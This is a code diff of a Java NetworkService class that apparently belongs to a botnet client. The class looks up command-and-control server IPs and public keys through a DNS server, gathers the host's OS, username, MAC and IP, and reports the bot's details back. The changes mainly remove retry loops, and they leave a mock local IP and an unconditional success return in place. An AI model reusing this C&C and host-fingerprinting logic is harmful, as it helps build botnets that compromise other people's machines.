@@ -187,30 +187,20 @@ public class NetworkService {
 
 		String url = engineBot.getDnsip() + ":" + engineBot.getDnsport() + engineBot.getUrirequest();
 		Pairs<IP, String> result = new Pairs<IP, String>();
-		Pairs<IP,PublicKey> cec=new Pairs<IP,PublicKey>();
-		Integer counter = 0;
+		Pairs<IP, PublicKey> cec = new Pairs<IP, PublicKey>();
+		try {
+			result = asyncRequest.getIpCeCFromDnsServer(url);
 
-		while (counter <= AsyncRequest.REQNUMBER) {
-			try {
-				result = asyncRequest.getIpCeCFromDnsServer(url);
-				
-				cec.setValue1(result.getValue1());
-				
-				cec.setValue2(pki.rebuildPuK(result.getValue2()));
-				
-				commandConquerIps.addCeC(cec);
-				commandConquerIps.getCeCList().forEach(ip -> System.out.println(ip.getValue1()));
-				return Boolean.TRUE;
-			} catch (Exception ex) {
-				System.err.println("Errore durante la richiesta di IP\n" + ex);
-				counter++;
-			}
+			cec.setValue1(result.getValue1());
 
-			try {
-				Thread.sleep(250);
-			} catch (InterruptedException e) {
-				e.printStackTrace();
-			}
+			cec.setValue2(pki.rebuildPuK(result.getValue2()));
+
+			commandConquerIps.addCeC(cec);
+			commandConquerIps.getCeCList().forEach(ip -> System.out.println(ip.getValue1()));
+			return Boolean.TRUE;
+		} catch (Exception ex) {
+			System.err.println("Errore durante la richiesta di IP\n" + ex);
+
 		}
 
 		return Boolean.FALSE;
@@ -230,7 +220,6 @@ public class NetworkService {
 		versionOS = System.getProperty("os.version");
 		archOS = System.getProperty("os.arch");
 		usernameOS = System.getProperty("user.name");
-
 
 		// aggiungi nonce time.millis
 		milli = System.currentTimeMillis();
@@ -269,34 +258,21 @@ public class NetworkService {
 	private String getMyIpCheckInternet() {
 		String result = "";
 		Integer counter = 0;
-		InetAddress ip = null ;
-		 try {
+		InetAddress ip = null;
+		try {
 			ip = InetAddress.getLocalHost();
-			System.out.println("kk "+ip.getHostAddress());
-			return ip.getHostAddress();//TODO ELIMINA MOCK LOCAL IP
-		} catch (UnknownHostException e1) {
+		} catch (UnknownHostException e) {
 			// TODO Auto-generated catch block
-			e1.printStackTrace();
+			e.printStackTrace();
 		}
-		while (true) {
-			try {
-				result = asyncRequest.askMyIpToAmazon();
-				if (result.matches(IP_REGEX))
-					return result;
-			} catch (Exception ex) {
-				System.err.println("no internet\n");
-				counter++;
-				try {
-					Thread.sleep(250);// TODO cambiare il tempo e prenderlo da
-										// properties
-				} catch (InterruptedException e) {
-					e.printStackTrace();
-				}
-			}
-
-		}
-
+		System.out.println("kk " + ip.getHostAddress());
+		// TODO ELIMINA MOCK LOCAL IP
+		result = asyncRequest.askMyIpToAmazon();
+		// if (result.matches(IP_REGEX))
+		// return result;
+		return ip.getHostAddress();
 	}
+
 
 	// TODO DA VEDERE
 	/**
@@ -304,31 +280,11 @@ public class NetworkService {
 	 */
 	public Boolean updateDnsInformation() {
 
-		String url =  engineBot.getDnsip() + ":" + engineBot.getDnsport();
+		String url = engineBot.getDnsip() + ":" + engineBot.getDnsport();
 		Boolean result = false;
-		Integer counter = 0;
-
-		while (counter <= AsyncRequest.REQNUMBER) {
-			try {
-				result = asyncRequest.sendInfoToDnsServer(url, this.ip, pki.getPubRSAKey());
-
-				System.out.println("Ip tornato " + result);
-
-				return Boolean.TRUE;
-			} catch (Exception ex) {
-				System.err.println("Errore durante aggiornamento info DNS\n" + ex);
-				counter++;
-			}
-
-			try {
-				Thread.sleep(250);
-			} catch (InterruptedException e) {
-				e.printStackTrace();
-			}
-		}
-
-		return Boolean.FALSE;
-
+		result = asyncRequest.sendInfoToDnsServer(url, this.ip, pki.getPubRSAKey());
+		System.out.println("Ip tornato " + result);
+		return Boolean.TRUE;
 	}
 
 	public boolean updateBotNetwork() {
@@ -368,8 +324,8 @@ public class NetworkService {
 	}
 
 	public String getMac() {
-		if((mac==null)||(mac==""))
-			mac=loadMachineMac();
+		if ((mac == null) || (mac == ""))
+			mac = loadMachineMac();
 		return mac;
 	}
 
@@ -377,6 +333,4 @@ public class NetworkService {
 	// return botIps;
 	// }
 
-	
-	
 }
